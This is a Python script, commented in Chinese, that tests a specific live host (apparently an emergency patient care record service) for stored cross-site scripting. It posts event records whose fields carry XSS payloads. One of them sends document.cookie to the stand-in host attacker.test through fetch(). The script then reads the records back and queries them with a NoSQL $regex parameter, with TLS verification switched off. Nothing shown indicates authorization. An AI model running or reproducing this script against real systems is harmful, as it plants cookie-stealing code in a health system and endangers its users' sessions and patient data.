#!/usr/bin/env python3
"""
Stored XSS 验证: Annotation/TypeOfEventTxt 字段未做 HTML 转义
- 写入带 XSS payload 的事件
- 立即 GET 拉回看 payload 是否被存储和回显
"""
import httpx, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

c = httpx.Client(base_url="https://epcr.tpf.gov.tw:4001", verify=False, timeout=30,
    headers={"User-Agent":"Mozilla/5.0", "Content-Type":"application/json"})

print("=== 1. 测试 1: Annotation 字段纯 XSS payload ===")
# 用 svg/onload payload (不会破坏 JSON 结构)
xss_payload_1 = '<svg onload=alert(1) src=x>'
data1 = {
    "CaseID": "TestXSSTest0001",
    "recordUuid": "TestXSSTest0001",
    "Status": "active",
    "Systolic": 100,
    "Diastolic": 70,
    "Mean": 80,
    "Annotation": xss_payload_1,
    "TypeOfEventTxt": "XSS_TEST_ANNOTATION"
}
r = c.post("/events", json=data1)
print(f"  POST status={r.status_code}, response={r.text[:300]}")

# GET 看是否落地
if r.status_code == 201:
    loc = r.headers.get("Location", "")
    print(f"  Location: {loc}")
    new_id = loc.split("/")[-1] if loc else None
    if new_id:
        r2 = c.get(f"/events/{new_id}")
        if r2.status_code == 200:
            stored = r2.json()
            print(f"  Stored Annotation: {stored.get('Annotation')!r}")
            print(f"  Stored TypeOfEventTxt: {stored.get('TypeOfEventTxt')!r}")
            print(f"  Payloads preserved: {xss_payload_1 == stored.get('Annotation')}")
        else:
            print(f"  GET /events/{new_id}: {r2.status_code}")

print("\n=== 2. 测试 2: TypeOfEventTxt 字段 XSS ===")
xss_payload_2 = '<img src=x onerror=fetch("https://attacker.test/?c="+document.cookie)>'
data2 = {
    "CaseID": "TestXSSTest0002",
    "recordUuid": "TestXSSTest0002",
    "Status": "active",
    "Systolic": 110,
    "Diastolic": 75,
    "Mean": 87,
    "Annotation": "legitimate test",
    "TypeOfEventTxt": xss_payload_2
}
r = c.post("/events", json=data2)
print(f"  POST status={r.status_code}")
if r.status_code == 201:
    loc = r.headers.get("Location", "")
    new_id = loc.split("/")[-1] if loc else None
    if new_id:
        r2 = c.get(f"/events/{new_id}")
        if r2.status_code == 200:
            stored = r2.json()
            print(f"  Stored TypeOfEventTxt: {stored.get('TypeOfEventTxt')!r}")
            print(f"  Payloads preserved: {xss_payload_2 == stored.get('TypeOfEventTxt')}")

print("\n=== 3. 测试 3: 检查之前注入的真实恶意样本是否已被存储 ===")
# 查询 recordUuid[$regex]=^TestXSS
r = c.get("/events", params={"page":1, "pageSize":100, "recordUuid[$regex]":"^TestXSSTest"})
print(f"  TestXSSTest records: {len(r.json()) if r.status_code == 200 else r.status_code}")
if r.status_code == 200:
    for evt in r.json():
        print(f"    id={evt.get('id')}, Annotation={evt.get('Annotation')!r}, TypeOfEventTxt={evt.get('TypeOfEventTxt')!r}")
